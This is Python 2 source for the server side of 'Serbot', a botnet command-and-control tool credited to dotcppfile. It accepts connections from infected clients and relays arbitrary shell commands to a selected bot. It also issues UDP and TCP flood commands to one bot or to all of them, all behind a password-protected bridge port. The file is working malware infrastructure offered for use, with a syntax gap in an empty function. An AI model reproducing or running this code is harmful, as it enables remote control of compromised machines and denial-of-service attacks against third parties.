#!/usr/bin/env python2
#v3

import os, sys, time
from socket import *

if (len(sys.argv) == 4):
	port = int(sys.argv[1])
	password = sys.argv[2]
	bridgeport = int(sys.argv[3])
else:
	sys.exit("Usage: server.py <port> <password> <bridge port>")

intro = """
 ____ ____ ____ ____ ____ ____ 
||S |||e |||r |||b |||o |||t ||
||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|

Coded by: dotcppfile
Twitter: https://twitter.com/dotcppfile
Blog: http://dotcppfile.worpdress.com"
"""

s=socket(AF_INET, SOCK_STREAM)
s.settimeout(5)
s.bind(("0.0.0.0",port)) 
s.listen(100)

allConnections = []
allAddresses = []

def updateLogs():
	

def quitClients():
	for item in allConnections:
		try:
			item.send("exit")
			item.close()
		except:
			pass

	del allConnections[:]
	del allAddresses[:]	

def getConnections():
	for item in allConnections:
		item.close()

	del allConnections[:]
	del allAddresses[:]

	while 1:
		try:
			q,addr=s.accept()
			q.setblocking(1)
			allConnections.append(q)
			allAddresses.append(addr)
		except:
			break

def main():
	bridge=socket(AF_INET, SOCK_STREAM)
	bridge.bind(("0.0.0.0",bridgeport))
	bridge.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	while 1:
		bridge.listen(1)
		q,addr=bridge.accept()

		cpass = q.recv(10240)
		if (cpass == password):
			loginsucc=True
		else:
			loginsucc=False

		breakit = False
		while 1:
			if (loginsucc == False):
				quitClients()
				break

			if (breakit == True):
				quitClients()
				break

			timeout = time.time() + 600
			if (time.time() > timeout):
				quitClients()
				break

			command = q.recv(10240)
			if (command == "accept"):
				getConnections()
				q.send("[INFO] Done Accepting\n")
			elif(command == "list"):
				temporary = ""
				for item in allAddresses:
					temporary += "%d - %s|%s\n" % (allAddresses.index(item) + 1, str(item[0]), str(item[1]))
				if (temporary != ""):
					q.send(temporary)
				else:
					q.send("[INFO] No clients\n")
			elif("interact " in command):
				chosenone = int(command.replace("interact ","")) - 1
				if ((chosenone < len(allAddresses)) and (chosenone >= 0 )):
					q.send("[INFO] Interacting with %s\n" % str(allAddresses[chosenone]))
					try:
						allConnections[chosenone].send("hellows123")
						vtpath = allConnections[chosenone].recv(10240) + ">"
						q.send(vtpath)
					
						while 1:
							if (time.time() > timeout):
								breakit = True
								break

							try:
								data=q.recv(10240)
								if ((data != "stop") and ("cd " not in data) and ("udpflood " not in data) and ("tcpflood " not in data) and (data != "quit")):
									try:
										allConnections[chosenone].send(data)
										msg=allConnections[chosenone].recv(10240)
										q.send(msg)							
									except:
										q.send("[ERROR] Client closed the connection\n")
										break
								elif ("cd " in data):
									try:
										allConnections[chosenone].send(data)
										msg=allConnections[chosenone].recv(10240)
										vtpath = msg + ">"
							
										q.send(vtpath)
									except:
										q.send("[ERROR] Client closed the connection\n")
										break

								elif ("udpflood " in data or "tcpflood " in data):
									try:
										allConnections[chosenone].send(data)
										q.send("[INFO] Command sent\n")
									except:
										q.send("[ERROR] Client closed the connection\n")
										break
								elif (data == "stop"):
									break
								
								elif (data == "quit"):
									breakit = True
									break
							except:
								quitClients()
								break
					except:
						q.send("[ERROR] Client closed the connection\n")
				else:
					q.send("[ERROR] Client doesn't exist\n")
			elif ("udpfloodall " in command or "tcpfloodall " in command):
				for item in allConnections:
					try:
						item.send(command)
					except:
						pass
			elif(command == "quit"):
				quitClients()
				break
			else:
				q.send("[ERROR] Invalid Command\n")


while 1:
	try:		
		main()
	except KeyboardInterrupt:
		try:
			quitClients()

			del allConnections[:]
			del allAddresses[:]
		except:
			pass
	time.sleep(5)
		
